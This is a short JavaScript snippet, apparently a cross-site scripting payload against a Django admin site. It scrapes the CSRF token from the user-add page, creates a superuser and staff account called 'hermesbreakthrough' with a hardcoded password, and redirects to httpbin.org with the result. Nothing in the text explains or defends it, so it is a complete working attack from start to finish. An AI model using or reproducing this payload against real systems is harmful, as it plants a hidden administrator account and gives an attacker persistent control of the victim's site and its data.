fetch('/admin/auth/user/add/').then(r=>r.text()).then(t=>{
  let m=t.match(/csrfmiddlewaretoken['"]?\s*value=['"]([^'"]+)/);
  if(!m){ location='https://httpbin.org/get?done=NO_CSRF'; return; }
  let f=new FormData();
  f.append('csrfmiddlewaretoken',m[1]);
  f.append('username','hermesbreakthrough');
  f.append('password1','HermesBreak123!');
  f.append('password2','HermesBreak123!');
  f.append('is_superuser','on');
  f.append('is_staff','on');
  f.append('_save','Save');
  fetch('/admin/auth/user/add/',{method:'POST',body:f}).then(rr=>rr.text()).then(tt=>{
    location='https://httpbin.org/get?done=OK&status='+(tt.includes('hermesbreakthrough')?'CREATED':'NOT_CREATED')+'&len='+tt.length;
  }).catch(e=>location='https://httpbin.org/get?done=POST_ERR&msg='+encodeURIComponent(e.message));
}).catch(e=>location='https://httpbin.org/get?done=FETCH_ERR&msg='+encodeURIComponent(e.message));
